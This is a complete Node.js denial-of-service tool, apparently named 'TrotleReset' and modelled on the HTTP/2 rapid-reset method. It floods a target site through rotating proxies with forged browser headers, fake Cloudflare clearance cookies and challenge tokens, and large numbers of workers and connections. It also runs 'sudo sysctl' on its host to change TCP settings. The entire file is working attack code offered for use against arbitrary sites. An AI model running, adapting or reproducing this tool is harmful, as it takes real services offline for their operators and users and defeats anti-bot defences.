const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function(e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const blockedDomain = [];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--qu');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bf');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--de');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--co');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--re');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--po');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--ra');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--he');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--ua');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--ht');
const useLegitHeaders = process.argv.includes('--le');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--de') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log("node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>");
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`Error ratelimit can not high 90`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    if (!Buffer.isBuffer(payload)) {
        payload = Buffer.from(payload);
    }

    const payloadLength = payload.length;
    const frameHeader = Buffer.alloc(9);

    frameHeader.writeUIntBE(payloadLength, 0, 3);
    frameHeader.writeUInt8(type, 3);

    frameHeader.writeUInt8(flags, 4);

    frameHeader.writeUInt32BE(streamId, 5);

    if (payloadLength > 0) {
        return Buffer.concat([frameHeader, payload]);
    } else {
        return frameHeader;
    }
}

function decodeFrame(data) {
    if (data.length < 9) {
        return null;
    }

    const length = data.readUIntBE(0, 3);
    const type = data.readUInt8(3);

    const flags = data.readUInt8(4);

    const streamId = data.readUInt32BE(5);

    let payloadOffset = 9;
    let actualPayloadLength = length;

    let padLength = 0;
    if (flags & 0x8) {
        if (data.length < payloadOffset + 1) {
            return null;
        }
        padLength = data.readUInt8(payloadOffset);
        payloadOffset += 1;
        actualPayloadLength -= (1 + padLength);
    }

    if (actualPayloadLength < 0) {
        return null;
    }
    if (data.length < payloadOffset + actualPayloadLength + padLength) {
        return null;
    }

    let payload = Buffer.alloc(0);
    if (actualPayloadLength > 0) {
        payload = data.subarray(payloadOffset, payloadOffset + actualPayloadLength);
    }

    if (payload.length !== actualPayloadLength) {
        return null;
    }

    return {
        streamId,
        length,
        type,
        flags,
        actualPayloadLength,
        padLength,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        const settingId = settings[i][0];
        const settingValue = settings[i][1];
        data.writeUInt16BE(settingId, i * 6);
        data.writeUInt32BE(settingValue, i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode) {
    const frameType = 0x3;
    const flags = 0;
    const payloadLength = 4;

    const payload = Buffer.alloc(payloadLength);
    payload.writeUInt32BE(errorCode, 0);

    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUIntBE(payloadLength, 0, 3);
    frameHeader.writeUInt8(frameType, 3);
    frameHeader.writeUInt8(flags, 4);
    frameHeader.writeUInt32BE(streamId, 5);

    return Buffer.concat([frameHeader, payload]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
//h2
function mscjs(reqmethod, url, query, postdata, customUA, refererValue, hcookie, customHeaders, useLegitHeaders, timestampString) {
    const browserVersion = getRandomInt(120, 123);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    const ref = ['same-site', 'same-origin', 'cross-site'];
    const ref1 = ref[Math.floor(Math.random() * ref.length)];
    let brandValue;

    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const secGpcValue = isBrave ? '1' : undefined;

    const secChUaModel = isBrave ? '""' : undefined;
    const secChUaPlatform = isBrave ? 'Windows' : undefined;
    const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
    const secChUaMobile = isBrave ? '?0' : undefined;

    let userAgent;
    if (customUA) {
        userAgent = customUA;
    } else {
        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    }

    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + '.net' : refererValue;

    function handleQuery(q) {
        if (q === '1') {
            return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
        } else if (q === '2') {
            return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
        } else if (q === '3') {
            return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
        } else {
            return url.pathname;
        }
    }

    const customHeadersArray = [];
    if (customHeaders) {
        const customHeadersList = customHeaders.split('#');
        for (const header of customHeadersList) {
            const [name, value] = header.split(':');
            if (name && value) {
                customHeadersArray.push({
                    [name.trim().toLowerCase()]: value.trim()
                });
            }
        }
    }

    const headers = Object.entries({
        ':method': reqmethod,
        ':authority': url.hostname,
        ':scheme': 'https',
        ':path': query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ''),
    }).concat(Object.entries({
        ...(Math.random() < 0.4 && { 'cache-control': 'max-age=0' }),
        ...(reqmethod === 'POST' && { 'content-length': '0' }),
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'user-agent': userAgent,
        accept: acceptHeaderValue,
        ...(secGpcValue && { 'sec-gpc': secGpcValue }),
        ...(secChUaMobile && { 'sec-ch-ua-mobile': secChUaMobile }),
        ...(secChUaModel && { 'sec-ch-ua-model': secChUaModel }),
        ...(secChUaPlatform && { 'sec-ch-ua-platform': secChUaPlatform }),
        ...(secChUaPlatformVersion && { 'sec-ch-ua-platform-version': secChUaPlatformVersion }),
        ...(Math.random() < 0.5 && { 'sec-fetch-site': currentRefererValue ? ref1 : 'none' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-mode': 'navigate' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-user': '?1' }),
        ...(Math.random() < 0.5 && { 'sec-fetch-dest': 'document' }),
        'accept-encoding': 'gzip, deflate, br',
        ...(hcookie && { cookie: hcookie }),
        ...(currentRefererValue && { referer: currentRefererValue }),
        ...customHeadersArray.reduce((acc, header) => ({...acc, ...header }), {})
    }).filter(a => a[1] != null));

    const headers3 = Object.entries({
        ':method': reqmethod,
        ':authority': url.hostname,
        ':scheme': 'https',
        ':path': query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ''),
    }).concat(Object.entries({
        ...(Math.random() < 0.4 && { 'cache-control': 'max-age=0' }),
        ...(reqmethod === 'POST' && { 'content-length': '0' }),
        'sec-ch-ua': secChUa,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'user-agent': userAgent,
        accept: acceptHeaderValue,
        ...(secGpcValue && { 'sec-gpc': secGpcValue }),
        ...(secChUaMobile && { 'sec-ch-ua-mobile': secChUaMobile }),
        ...(secChUaModel && { 'sec-ch-ua-model': secChUaModel }),
        ...(secChUaPlatform && { 'sec-ch-ua-platform': secChUaPlatform }),
        ...(secChUaPlatformVersion && { 'sec-ch-ua-platform-version': secChUaPlatformVersion }),
        'sec-fetch-site': currentRefererValue ? ref1 : 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-encoding': 'gzip, deflate, br',
        ...(hcookie && { cookie: hcookie }),
        ...(currentRefererValue && { referer: currentRefererValue }),
        ...customHeadersArray.reduce((acc, header) => ({...acc, ...header }), {})
    }).filter(a => a[1] != null));

    const headers2 = Object.entries({
        ...(Math.random() < 0.3 && {
            [`x-client-session${getRandomChar}`]: `none${getRandomChar}`
        }),
        ...(Math.random() < 0.3 && {
            [`sec-ms-gec-version${getRandomChar}`]: `undefined${getRandomChar}`
        }),
        ...(Math.random() < 0.3 && {
            [`sec-fetch-users${getRandomChar}`]: `?0${getRandomChar}`
        }),
        ...(Math.random() < 0.3 && {
            [`x-request-data${getRandomChar}`]: `dynamic${getRandomChar}`
        }),
    }).filter(a => a[1] != null);

    for (let k = headers2.length - 1; k > 0; k--) {
        const j = Math.floor(Math.random() * (k + 1));
        [headers2[k], headers2[j]] = [headers2[j], headers2[k]];
    }

    const baseHeaders = useLegitHeaders ? [...headers3] : [...headers, ...headers2];

    const pseudoHeaders = baseHeaders.filter(h => h[0].startsWith(':'));
    let otherHeaders = baseHeaders.filter(h => !h[0].startsWith(':'));

    for (let k = otherHeaders.length - 1; k > 0; k--) {
        const j = Math.floor(Math.random() * (k + 1));
        [otherHeaders[k], otherHeaders[j]] = [otherHeaders[j], otherHeaders[k]];
    }

    return [...pseudoHeaders, ...otherHeaders];
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave ?
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' :
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';


    const langValue = isBrave ?
        'en-US,en;q=0.6' :
        'en-US,en;q=0.7';

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;

    const minPaddingBytes = 65536;
    const maxPaddingBytes = 131072;
    const randomPaddingSize = getRandomInt(minPaddingBytes, maxPaddingBytes);
    const padding = crypto.randomBytes(randomPaddingSize).toString('base64');

    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        `X-Padding: ${padding}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${userAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    const numExtraHeaders = getRandomInt(1, 4);
    for (let i = 0; i < numExtraHeaders; i++) {
        const headerName = `X-Custom-Data-${getRandomInt(1000, 9999)}`;
        const headerValueSize = getRandomInt(256, 1024)
        const headerValue = crypto.randomBytes(headerValueSize).toString('hex');
        headers += `${headerName}: ${headerValue}\r\n`;
    }

    if (hcookie) {
        if (!headers.endsWith('\r\n')) {
            headers += '\r\n';
        }
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        if (!headers.endsWith('\r\n')) {
            headers += '\r\n';
        }
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    if (mysor === '') {
        if (!headers.endsWith('\r\n')) {
            headers += '\r\n';
        }
        headers += '\r\n';
    } else if (!headers.endsWith('\r\n\r\n')) {
        if (headers.endsWith('\r\n')) {
            headers += '\r\n';
        } else {
            headers += '\r\n\r\n';
        }
    }


    const mmm = Buffer.from(headers, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function trotle() {
    let [proxyHost, proxyPort] = ['1.1.1.1', '3128'];

    if (customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[Math.floor(Math.random() * proxy.length)].split(':');
    }

    if (!proxyPort || isNaN(proxyPort)) {
        return trotle();
    }

    let tlsSocket;
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? (Math.random() >= 0.5 ? ['h2'] : ['http/1.1']) : ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: [
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'TLS_AES_128_GCM_SHA256',
                    'ECDHE-ECDSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'ECDHE-ECDSA-CHACHA20-POLY1305',
                    'ECDHE-RSA-CHACHA20-POLY1305',
                    'ECDHE-ECDSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES128-GCM-SHA256'
                ].join(':'),
                sigalgs: 'rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:ecdsa_secp256r1_sha256:rsa_pkcs1_sha384',
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_NO_RENEGOTIATION,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                    if (forceHttp === 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    (function doWriteHttp1() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(doWriteHttp1, isFull ? 1000 : 1000 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    })();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp === 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', function handleData(eventData) {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (!frame) break;
                        data = data.subarray(frame.length + 9);

                        if (frame.type === 4 && frame.flags === 0) {
                            tlsSocket.write(encodeFrame(0, 4, '', 1));
                        }
                        if (frame.type === 1 && debugMode) {
                            const headers = hpack.decode(frame.payload);
                            const statusEntry = headers.find(x => x[0] === ':status');

                            if (statusEntry) {
                                const status = statusEntry[1];
                                statuses[status] = (statuses[status] || 0) + 1;
                                if ((status === '403' || status === '429') && !tlsSocket.destroyed) {
                                    tlsSocket.destroy();
                                    netSocket.destroy();
                                    return trotle();
                                }
                            }
                        }
                        if (frame.type === 7 || frame.type === 5) {
                            if (frame.type === 7 && debugMode) {
                                statuses['GOAWAY'] = (statuses['GOAWAY'] || 0) + 1;
                            }
                            tlsSocket.write(encodeRstStream(0, 3, 0));
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    }
                });
                tlsSocket.write(Buffer.concat(frames));

                (function doWriteHttp2() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const currentRatelimit = randrate !== undefined ? getRandomInt(1, 59) : process.argv[6];

                    for (let i = 0; i < (isFull ? currentRatelimit : 1); i++) {
                        const finalHeadersToEncode = mscjs(reqmethod, url, query, postdata, customUA, refererValue, hcookie, customHeaders, useLegitHeaders, timestampString);

                        finalHeadersToEncode.push([
                            'x-request-id',
                            `req-${streamId}-${Date.now()}-${Math.random().toString(36).substring(2, 10)}`
                        ]);

                        const randomDataSize = 32 + Math.floor(Math.random() * 96);
                        finalHeadersToEncode.push([
                            'x-random-payload',
                            crypto.randomBytes(randomDataSize).toString('hex')
                        ]);

                        const possibleValues = ['valueA', 'valueB', 'valueC', 'valueD', 'valueE'];
                        finalHeadersToEncode.push([
                            'x-variant-header',
                            possibleValues[Math.floor(Math.random() * possibleValues.length)]
                        ]);

                        finalHeadersToEncode.push([
                            'x-client-sequence',
                            `${streamId % 100}`
                        ]);

                        finalHeadersToEncode.push([
                            'accept-language',
                            `en-US,en;q=0.${Math.floor(Math.random() * 5) + 5},id;q=0.${Math.floor(Math.random() * 4)}`
                        ]);

                        const headerBlockFragment = hpack.encode(finalHeadersToEncode);
                        const priorityInfo = Buffer.from([0x00, 0x00, 0x00, 0x00, 0xFF]);

                        let framePayload;
                        let currentFlags = 0x25;

                        if (Math.random() < 0.5) {
                            const paddingLength = getRandomInt(1, 32);
                            currentFlags |= 0x8;
                            const paddingBytes = Buffer.alloc(paddingLength);
                            framePayload = Buffer.concat([Buffer.from([paddingLength]), priorityInfo, headerBlockFragment, paddingBytes]);
                        } else {
                            framePayload = Buffer.concat([priorityInfo, headerBlockFragment]);
                        }
                        requests.push(encodeFrame(streamId, 1, framePayload, currentFlags));
                        streamId += 2;
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {

                            setTimeout(doWriteHttp2, isFull ? 1000 : 1000 / currentRatelimit);
                        }
                    });
                })();
            }).on('error', (err) => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
                if (netSocket && !netSocket.destroyed) netSocket.destroy();
            }).on('end', () => {
                if (netSocket && !netSocket.destroyed) netSocket.destroy();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', (err) => {
        trotle();
    }).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.end(() => tlsSocket.destroy());
    });
}


function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => {});
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start / mtd @rapidreset <D3velop / @mscjs ? TrotleReset (1.0)`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        trotle()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}